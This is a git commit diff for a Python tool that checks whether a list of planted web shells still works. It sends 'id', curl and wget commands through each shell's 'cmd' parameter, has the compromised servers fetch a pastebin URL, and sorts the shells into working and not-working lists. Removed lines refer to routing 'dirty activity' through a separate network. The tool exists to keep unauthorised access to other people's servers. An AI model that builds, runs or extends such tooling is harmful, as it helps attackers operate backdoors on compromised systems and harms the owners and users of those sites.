85e6bfc6ce7747a9b332964b961e58e0a3c42a8e
unknown-soul <andriyroy3@gmail.com>
2024-09-17 03:30:39 -0400

    Fixed bugs with local variables. Changes in workflow logic. Added progress bar. Removed unnecessary arguments

--- README.md
+++ README.md
@@ -15,6 +15,12 @@ Run
 python shell-checker.py -l <path to list with web shells>
 ```
 
+Additional options
+```
+-debug: Optional parameter. Detailed request and response output.
+-verbose: Optiuonal parameter. Prints result of what line is now in process and detailed message for current shell.
+```
+
 To add this script to scheduler run
 ```
 chmod +x checker-cron-job.sh
@@ -22,3 +28,14 @@ sudo ./checker-cron-job.sh
 ```
 
 ## Technical information
+Due to some technical reasons in this tool implemented some restrictions in requests setup.
+First of all it ignores invalid or self-signed certificate. Second, timeout option, redirects and amount of retries. 
+* Timeout = 7 sec 
+* Max retries = 5
+* Redirects = 3. 
+
+Retries forced also on 500, 502, 503, 504 status code.
+In some cases if amount of shell are huge and internet connection unstable implemented 5 retry for function that sends 
+request after 10 seconds of pause. For now this feature hasn't tested properly.
+
+Supports file in `.txt` and `.csv` file extension.
--- shell-checker.py
+++ shell-checker.py
@@ -1,13 +1,15 @@
 import argparse
-import os
 import sys
 import time
 import logging
+from progress.bar import FillingSquaresBar
 
 import requests
 import pandas
 import urllib3
 from requests.adapters import HTTPAdapter, Retry
+import http.client as http_client
+
 # Suppress only the single warning from urllib3.
 urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)
 
@@ -15,53 +17,64 @@ ascii_purple_color = "\x1b[38;5;13m"
 ascii_green_color = "\x1b[32m"
 ascii_red_color = "\x1b[1;31m"
 reset_ascii_color = "\u001B[0m"
-
+error_count_retries = 0
+response_text_id = None
+response_text_curl = None
+response_text_wget = None
 
 
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Checks shell status")
     parser.add_argument('-l', help='Path to list with web shells', required=True)
-    # blue network - trusted; red - non-trusted;
-    parser.add_argument('-blue-network', help='Network for writing results to API.', required=False)
-    parser.add_argument('-red-network', help='Network for sending requests.', required=False)
+    parser.add_argument('-debug', help='Added debug mode output.', required=False)
+    parser.add_argument('-verbose', help='Added debug mode output.', required=False)
     parser.format_help()
     args = parser.parse_args()
-    # changing network for dirty activity
-    trusted_network = args.blue_network
-    non_trusted_network = args.red_network
+    debug_mode = args.debug
     shells_list = args.l
-    time.sleep(3)
-    # os.system(f"nmcli connection up {non_trusted_network}")
-    if len(sys.argv) == 0 or shells_list == '' or args is None:
+    verbose = args.verbose
+    if len(sys.argv) == 0 or shells_list == '' or args is None or len(sys.argv) > 3:
         parser.print_help()
         sys.exit(1)
+    if debug_mode:
+        http_client.HTTPConnection.debuglevel = 1
+        requests_log = logging.getLogger("requests.packages.urllib3")
+        requests_log.propagate = True
     if args.l.endswith('.txt'):
-        check_status_txt_file(shells_list, trusted_network)
+        check_status_txt_file(shells_list, verbose)
     if args.l.endswith('.csv'):
-        check_status_csv_file(shells_list, trusted_network)
+        check_status_csv_file(shells_list, verbose)
 
 
-def check_status_txt_file(path, trusted_network):
+def check_status_txt_file(path, verbose):
     with (open(path) as txt_file):
+        line_count = sum(1 for _ in txt_file)
+        bar = FillingSquaresBar('Processing', max=line_count)
         for line in txt_file:
-            send_requests_and_check_responses(line)
+            bar.next()
+            send_requests_and_check_responses(line, verbose)
+    bar.finish()
     txt_file.close()
-    write_results_to_api_service(trusted_network)
 
 
-def check_status_csv_file(path, trusted_network):
+def check_status_csv_file(path, verbose):
     with (open(path, newline='') as csv_file):
         results = pandas.read_csv(csv_file, usecols=['url'])
         row_count = len(results)
+        bar = FillingSquaresBar('Processing', max=row_count)
         for index in range(row_count):
             line = results.__array__().item(index)
-            send_requests_and_check_responses(line)
+            bar.next()
+            send_requests_and_check_responses(line, verbose)
+    bar.finish()
     csv_file.close()
-    write_results_to_api_service(trusted_network)
 
 
-def send_requests_and_check_responses(shell_url):
-    # TODO: think about change file logic open and saving data on exception
+def send_requests_and_check_responses(shell_url, verbose):
+    global error_count_retries
+    global response_text_id
+    global response_text_curl
+    global response_text_wget
     cmd_wget = "wget https://pastebin.com/raw/NYE0HT2k --output-document - | head -n1"
     cmd_id = "id"
     cmd_curl = "curl https://pastebin.com/raw/NYE0HT2k"
@@ -70,36 +83,56 @@ def send_requests_and_check_responses(shell_url):
 
     file_with_working_shells = "working.txt"
     file_with_not_working_shells = "not_working.txt"
-    logging.basicConfig()
-    logging.getLogger().setLevel(logging.DEBUG)
-    requests_log = logging.getLogger("requests.packages.urllib3")
-    requests_log.setLevel(logging.DEBUG)
-    requests_log.propagate = True
 
-    requests.get('https://httpbin.org/headers')
     with open(file_with_working_shells, 'w') as working_shells_file:
         with open(file_with_not_working_shells, 'w') as not_working_shells_file:
-            print(ascii_green_color + "Checking shell: " + shell_url + reset_ascii_color)
+            if verbose:
+                print(ascii_green_color + "Checking shell: " + shell_url + reset_ascii_color)
 
-            s = requests.Session()
-            s.max_redirects = 3
-            retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[404, 500, 502, 503, 504])
-            s.mount('http://', HTTPAdapter(max_retries=retries))
-            s.mount('https://', HTTPAdapter(max_retries=retries))
-            s.headers.update({'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
-                                            'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.3'})
+            session = requests.Session()
+            session.max_redirects = 3
+            retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
+            session.mount('http://', HTTPAdapter(max_retries=retries))
+            session.mount('https://', HTTPAdapter(max_retries=retries))
+            session.headers.update({'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
+                                                  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.3'})
 
             try:
-                response_text_id = requests.get(shell_url + f"?cmd={cmd_id}", timeout=7000, verify=False).text
-                response_text_curl = requests.get(shell_url + f"?cmd={cmd_curl}", timeout=7000, verify=False).text
-                response_text_wget = requests.get(shell_url + f"?cmd={cmd_wget}", timeout=7000, verify=False).text
+                response_text_id = session.get(shell_url + f"?cmd={cmd_id}", timeout=7, verify=False).text
+                response_text_curl = session.get(shell_url + f"?cmd={cmd_curl}", timeout=7, verify=False).text
+                response_text_wget = session.get(shell_url + f"?cmd={cmd_wget}", timeout=7, verify=False).text
             except requests.exceptions.ConnectionError as exception:
-                print(exception)
-                not_working_shells_file.write(shell_url + "\n")
-            except urllib3.exceptions:
-                print("Error was occurred during execution. Check network connection.")
-                not_working_shells_file.close()
-                working_shells_file.close()
+                time.sleep(10)
+                if error_count_retries < 5:
+                    error_count_retries += 1
+                    print(exception.__cause__)
+                    print(f"\n Connection Error. Retry # {error_count_retries}....")
+                    send_requests_and_check_responses(shell_url, verbose)
+
+                else:
+                    not_working_shells_file.flush()
+                    working_shells_file.flush()
+                    not_working_shells_file.write(shell_url + "\n")
+                    exit(1)
+            except requests.exceptions.TooManyRedirects:
+                print("\n Too many redirects. Continue...")
+                pass
+
+            except IOError as error:
+                print(error)
+                time.sleep(10)
+                if error_count_retries < 5:
+                    error_count_retries += 1
+                    print(
+                        f"\n Error was occurred during execution. Check network connection. Retry # {error_count_retries}")
+                    send_requests_and_check_responses(shell_url, verbose)
+                else:
+                    not_working_shells_file.flush()
+                    working_shells_file.flush()
+                    not_working_shells_file.close()
+                    working_shells_file.close()
+                    print("\n IO error. Exiting.")
+                    exit(1)
 
             contains_uid = response_text_id.find("uid")
             contains_wget_file = secret_message in response_text_wget
@@ -107,26 +140,27 @@ def send_requests_and_check_responses(shell_url):
             if contains_uid != -1 and contains_curl_file and contains_wget_file:
 
                 response_status = requests.get(shell_url + "?cmd=id").status_code
-                print(ascii_green_color + "Shell " + shell_url + " is alive." + "\n" +
-                      "Status code: " + str(response_status))
-                print("All necessary commands works." + reset_ascii_color)
+                if verbose:
+                    print(ascii_green_color + "Shell " + shell_url + " is alive." + "\n" +
+                          "Status code: " + str(response_status))
+                    print("All necessary commands works." + reset_ascii_color)
 
                 working_shells_file.write(shell_url + "\n")
+                working_shells_file.flush()
             elif contains_uid != -1 or contains_curl_file or contains_wget_file:
-                print(ascii_red_color + "Probably not all commands working" + reset_ascii_color)
+                if verbose:
+                    print(ascii_red_color + "Probably not all commands working." + reset_ascii_color)
                 not_working_shells_file.write(shell_url + "\n")
+                not_working_shells_file.flush()
             else:
-                print(ascii_red_color + "Shell did not respond: " + shell_url + "\n" +
-                      "Check path to shell " + reset_ascii_color)
+                if verbose:
+                    print(ascii_red_color + "Shell did not respond: " + shell_url + "\n" +
+                          "Check path to shell or shell doesn't alive." + reset_ascii_color)
                 not_working_shells_file.write(shell_url + "\n")
+                not_working_shells_file.flush()
 
     not_working_shells_file.close()
     working_shells_file.close()
-
-
-def write_results_to_api_service(trusted_network):
-    # os.system(f"nmcli connection uo {trusted_network}")
-    print("Updating result in API service...")
 
 
 def print_banner():
